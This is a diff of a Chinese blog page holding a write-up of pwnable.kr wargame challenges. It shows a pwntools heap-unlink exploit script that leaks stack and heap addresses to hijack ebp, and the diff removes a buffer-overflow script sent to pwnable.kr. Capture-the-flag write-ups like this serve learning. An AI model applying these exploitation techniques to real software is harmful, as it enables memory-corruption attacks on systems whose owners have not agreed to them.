@@ -129,7 +129,7 @@
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://hitworld.github.io/posts/c692c40b/1.png">
 <meta property="og:image" content="https://hitworld.github.io/posts/c692c40b/2.png">
-<meta property="og:updated_time" content="2020-08-25T11:40:29.680Z">
+<meta property="og:updated_time" content="2020-08-26T06:37:27.178Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="writeup-pwnable-kr">
 <meta name="twitter:description" content="unlink unlink函数可以任意写,程序unlink之后直接结束,只能覆盖返回地址 12345678void unlink(OBJ* P)&amp;#123;    OBJ* BK;    OBJ* FD;    BK=P-&amp;gt;bk;    FD=P-&amp;gt;fd;    FD-&amp;gt;bk=BK;    BK-&amp;gt;fd=FD;&amp;#125; main函数结尾汇编代码如下,可以更改ebp">
@@ -499,7 +499,7 @@
                 
                   <span class="post-meta-item-text">本文字数：</span>
                 
-                <span title="本文字数">1.2k</span>
+                <span title="本文字数">1k</span>
               
 
               
@@ -541,13 +541,9 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">"./unlink"</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"leak: "</span>)</span><br><span class="line">stack = int(r.recvline(),<span class="number">16</span>)</span><br><span class="line">r.recvuntil(<span class="string">"leak: "</span>)</span><br><span class="line">heap = int(r.recvline(),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"stack: "</span> + hex(stack)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"heap: "</span> + hex(heap)</span><br><span class="line"></span><br><span class="line">gdb.attach(r)</span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0x80484eb</span>) + p32(heap + <span class="number">0xc</span>) + <span class="string">"a"</span> * <span class="number">8</span> + p32(stack - <span class="number">0x20</span>) + p32(heap + <span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#FD = stack - 0x20;BK = heap + 0x10;heap + 0x10 = stack - 0x20;stack - 0x1c = heap + 0x10;</span></span><br><span class="line"><span class="comment">#stack - 0x1c即unlink被调用者保存的ebp,从而更改ebp</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 <h2 id="fd">fd</h2>
 <img src="/posts/c692c40b/1.png" title="fd">
-<hr>
 <p>标准输入的<code>fd</code>为<code>0</code>,以<code>0x1234</code>(<code>4660</code>)为命令行参数即可</p>
 <h2 id="col">col</h2>
 <img src="/posts/c692c40b/2.png" title="col">
-<hr>
-<h2 id="bof">bof</h2>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"pwnable.kr"</span>,<span class="string">"9000"</span>)</span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0xcafebabe</span>) * <span class="number">0x10</span></span><br><span class="line"><span class="comment">#懒得看偏移了</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -670,7 +666,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">172</span>
+                    <span class="site-state-item-count">171</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -862,7 +858,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#unlink"><span class="nav-number">1.</span> <span class="nav-text">unlink</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fd"><span class="nav-number">2.</span> <span class="nav-text">fd</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#col"><span class="nav-number">3.</span> <span class="nav-text">col</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bof"><span class="nav-number">4.</span> <span class="nav-text">bof</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#unlink"><span class="nav-number">1.</span> <span class="nav-text">unlink</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fd"><span class="nav-number">2.</span> <span class="nav-text">fd</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#col"><span class="nav-number">3.</span> <span class="nav-text">col</span></a></li></ol></div>
             
 
           </div>
@@ -894,7 +890,7 @@
       <i class="fa fa-area-chart"></i>
     </span>
     
-    <span title="站点总字数">727k</span>
+    <span title="站点总字数">705k</span>
   
 
   
@@ -903,7 +899,7 @@
       <i class="fa fa-coffee"></i>
     </span>
     
-    <span title="站点阅读时长">11:01</span>
+    <span title="站点阅读时长">10:41</span>
   
 </div>
 
